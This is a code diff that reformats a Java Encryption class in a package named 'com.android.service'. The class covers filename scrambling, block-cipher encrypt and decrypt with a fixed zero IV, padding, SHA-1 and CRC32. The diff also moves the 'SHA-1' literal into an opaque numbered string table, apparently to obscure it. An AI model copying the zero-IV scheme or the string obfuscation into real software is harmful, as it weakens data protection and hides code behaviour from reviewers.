@@ -15,6 +15,7 @@ import java.util.zip.CRC32;
 
 import javax.crypto.NoSuchPaddingException;
 
+import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
@@ -27,7 +28,8 @@ import com.android.service.util.Utils;
 public class Encryption {
 
 	/** The Constant TAG. */
-	private static final String TAG = "Encryption";
+	private static final String TAG = "Encryption"; //$NON-NLS-1$
+
 	/**
 	 * Inits the.
 	 */
@@ -60,7 +62,7 @@ public class Encryption {
 	 * @return the string
 	 */
 	public static String encryptName(final String Name, final int seed) {
-		// if(AutoConfig.DEBUG) Check.log( TAG + " seed : " + seed);
+		// if(AutoConfig.DEBUG) Check.log( TAG + " seed : " + seed) ;//$NON-NLS-1$
 		return scramble(Name, seed, true);
 	}
 
@@ -72,10 +74,16 @@ public class Encryption {
 	 * @return the next multiple
 	 */
 	public int getNextMultiple(final int len) {
-		if(Cfg.DEBUG) Check.requires(len >= 0, "len < 0");
+		if (Cfg.DEBUG) {
+			Check.requires(len >= 0, "len < 0"); //$NON-NLS-1$
+		}
 		final int newlen = len + (len % 16 == 0 ? 0 : 16 - len % 16);
-		if(Cfg.DEBUG) Check.ensures(newlen >= len, "newlen < len");
-		if(Cfg.DEBUG) Check.ensures(newlen % 16 == 0, "Wrong newlen");
+		if (Cfg.DEBUG) {
+			Check.ensures(newlen >= len, "newlen < len"); //$NON-NLS-1$
+		}
+		if (Cfg.DEBUG) {
+			Check.ensures(newlen % 16 == 0, "Wrong newlen"); //$NON-NLS-1$
+		}
 		return newlen;
 	}
 
@@ -93,17 +101,14 @@ public class Encryption {
 	 *            the enc
 	 * @return the string
 	 */
-	private static String scramble(final String name, int seed,
-			final boolean enc) {
+	private static String scramble(final String name, int seed, final boolean enc) {
 		final char[] retString = name.toCharArray();
 		final int len = name.length();
 		int i, j;
 
-		final char[] alphabet = { '_', 'B', 'q', 'w', 'H', 'a', 'F', '8', 'T',
-				'k', 'K', 'D', 'M', 'f', 'O', 'z', 'Q', 'A', 'S', 'x', '4',
-				'V', 'u', 'X', 'd', 'Z', 'i', 'b', 'U', 'I', 'e', 'y', 'l',
-				'J', 'W', 'h', 'j', '0', 'm', '5', 'o', '2', 'E', 'r', 'L',
-				't', '6', 'v', 'G', 'R', 'N', '9', 's', 'Y', '1', 'n', '3',
+		final char[] alphabet = { '_', 'B', 'q', 'w', 'H', 'a', 'F', '8', 'T', 'k', 'K', 'D', 'M', 'f', 'O', 'z', 'Q',
+				'A', 'S', 'x', '4', 'V', 'u', 'X', 'd', 'Z', 'i', 'b', 'U', 'I', 'e', 'y', 'l', 'J', 'W', 'h', 'j',
+				'0', 'm', '5', 'o', '2', 'E', 'r', 'L', 't', '6', 'v', 'G', 'R', 'N', '9', 's', 'Y', '1', 'n', '3',
 				'P', 'p', 'c', '7', 'g', '-', 'C' };
 
 		final int alphabetLen = alphabet.length;
@@ -118,7 +123,9 @@ public class Encryption {
 		if (seed == 0) {
 			seed = 1;
 		}
-		if(Cfg.DEBUG) Check.asserts(seed > 0, "negative seed");
+		if (Cfg.DEBUG) {
+			Check.asserts(seed > 0, "negative seed"); //$NON-NLS-1$
+		}
 		for (i = 0; i < len; i++) {
 			for (j = 0; j < alphabetLen; j++) {
 				if (retString[i] == alphabet[j]) {
@@ -126,8 +133,7 @@ public class Encryption {
 					if (enc) {
 						retString[i] = alphabet[(j + seed) % alphabetLen];
 					} else {
-						retString[i] = alphabet[(j + alphabetLen - seed)
-								% alphabetLen];
+						retString[i] = alphabet[(j + alphabetLen - seed) % alphabetLen];
 					}
 
 					break;
@@ -161,11 +167,15 @@ public class Encryption {
 		try {
 			crypto = new Crypto(key);
 		} catch (final NoSuchAlgorithmException e) {
-	
-			if(Cfg.DEBUG) { Check.log(e); }
+
+			if (Cfg.DEBUG) {
+				Check.log(e) ;//$NON-NLS-1$
+			}
 		} catch (final NoSuchPaddingException e) {
-			
-			if(Cfg.DEBUG) { Check.log(e); }
+
+			if (Cfg.DEBUG) {
+				Check.log(e) ;//$NON-NLS-1$
+			}
 		}
 	}
 
@@ -193,8 +203,7 @@ public class Encryption {
 	 * @throws CryptoException
 	 *             the crypto exception
 	 */
-	public byte[] decryptData(final byte[] cyphered, final int offset)
-			throws CryptoException {
+	public byte[] decryptData(final byte[] cyphered, final int offset) throws CryptoException {
 		return decryptData(cyphered, cyphered.length - offset, offset);
 	}
 
@@ -211,11 +220,14 @@ public class Encryption {
 	 * @throws CryptoException
 	 *             the crypto exception
 	 */
-	public byte[] decryptData(final byte[] cyphered, final int plainlen,
-			final int offset) throws CryptoException {
+	public byte[] decryptData(final byte[] cyphered, final int plainlen, final int offset) throws CryptoException {
 		final int enclen = cyphered.length - offset;
-		if(Cfg.DEBUG) Check.requires(enclen % 16 == 0, "Wrong padding");
-		if(Cfg.DEBUG) Check.requires(enclen >= plainlen, "Wrong plainlen");
+		if (Cfg.DEBUG) {
+			Check.requires(enclen % 16 == 0, "Wrong padding"); //$NON-NLS-1$
+		}
+		if (Cfg.DEBUG) {
+			Check.requires(enclen >= plainlen, "Wrong plainlen"); //$NON-NLS-1$
+		}
 		final byte[] plain = new byte[plainlen];
 		byte[] iv = new byte[16];
 
@@ -232,14 +244,18 @@ public class Encryption {
 
 			if ((i + 1 >= numblock) && (lastBlockLen != 0)) { // last turn
 				// and remaind
-				if(Cfg.DEBUG) Check.log( TAG + " lastBlockLen: " + lastBlockLen);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " lastBlockLen: " + lastBlockLen) ;//$NON-NLS-1$
+				}
 				System.arraycopy(pt, 0, plain, i * 16, lastBlockLen);
 			} else {
 				System.arraycopy(pt, 0, plain, i * 16, 16);
 				// copyblock(plain, i, pt, 0);
 			}
 		}
-		if(Cfg.DEBUG) Check.ensures(plain.length == plainlen, "wrong plainlen");
+		if (Cfg.DEBUG) {
+			Check.ensures(plain.length == plainlen, "wrong plainlen"); //$NON-NLS-1$
+		}
 		return plain;
 	}
 
@@ -272,7 +288,9 @@ public class Encryption {
 		final byte[] padplain = pad(plain, offset, len);
 		final int clen = padplain.length;
 
-		if(Cfg.DEBUG) Check.asserts(clen % 16 == 0, "Wrong padding");
+		if (Cfg.DEBUG) {
+			Check.asserts(clen % 16 == 0, "Wrong padding"); //$NON-NLS-1$
+		}
 		final byte[] crypted = new byte[clen];
 
 		byte[] iv = new byte[16]; // iv e' sempre 0
@@ -285,13 +303,17 @@ public class Encryption {
 
 			try {
 				ct = crypto.encrypt(pt);
-				if(Cfg.DEBUG) Check.asserts(ct.length == 16, "Wrong size");
+				if (Cfg.DEBUG) {
+					Check.asserts(ct.length == 16, "Wrong size"); //$NON-NLS-1$
+				}
 
 				System.arraycopy(ct, 0, crypted, i * 16, 16);
 				iv = Utils.copy(ct);
 			} catch (final Exception e) {
 				// TODO Auto-generated catch block
-				if(Cfg.DEBUG) { Check.log(e); }
+				if (Cfg.DEBUG) {
+					Check.log(e) ;//$NON-NLS-1$
+				}
 			}
 
 		}
@@ -310,18 +332,19 @@ public class Encryption {
 	 *            the length
 	 * @return the byte[]
 	 */
-	public static byte[] SHA1(final byte[] message, final int offset,
-			final int length) {
+	public static byte[] SHA1(final byte[] message, final int offset, final int length) {
 		MessageDigest digest;
 		try {
-			digest = MessageDigest.getInstance("SHA-1");
+			digest = MessageDigest.getInstance(Messages.getString("19.0")); //$NON-NLS-1$
 			digest.update(message, offset, length);
 			final byte[] sha1 = digest.digest();
 
 			return sha1;
 		} catch (final NoSuchAlgorithmException e) {
 			// TODO Auto-generated catch block
-			if(Cfg.DEBUG) { Check.log(e); }
+			if (Cfg.DEBUG) {
+				Check.log(e) ;//$NON-NLS-1$
+			}
 		}
 		return null;
 	}
@@ -336,15 +359,15 @@ public class Encryption {
 	public static byte[] SHA1(final byte[] message) {
 		return SHA1(message, 0, message.length);
 	}
-	
 
 	/**
 	 * Standard crc
+	 * 
 	 * @param packet
 	 * @return
 	 */
 	public static long CRC32(byte[] packet) {
-		CRC32 crc = new CRC32();
+		final CRC32 crc = new CRC32();
 		crc.reset();
 		crc.update(packet);
 		return crc.getValue();
@@ -378,8 +401,7 @@ public class Encryption {
 	 *            the pKC s5
 	 * @return the byte[]
 	 */
-	protected byte[] pad(final byte[] plain, final int offset, final int len,
-			final boolean PKCS5) {
+	protected byte[] pad(final byte[] plain, final int offset, final int len, final boolean PKCS5) {
 		final int clen = getNextMultiple(len);
 		if (clen > 0) {
 			final byte[] padplain = new byte[clen];
@@ -405,8 +427,12 @@ public class Encryption {
 	 *            the iv
 	 */
 	void xor(final byte[] pt, final byte[] iv) {
-		if(Cfg.DEBUG) Check.requires(pt.length == 16, "pt not 16 bytes long");
-		if(Cfg.DEBUG) Check.requires(iv.length == 16, "iv not 16 bytes long");
+		if (Cfg.DEBUG) {
+			Check.requires(pt.length == 16, "pt not 16 bytes long"); //$NON-NLS-1$
+		}
+		if (Cfg.DEBUG) {
+			Check.requires(iv.length == 16, "iv not 16 bytes long"); //$NON-NLS-1$
+		}
 		for (int i = 0; i < 16; i++) {
 			pt[i] ^= iv[i];
 		}
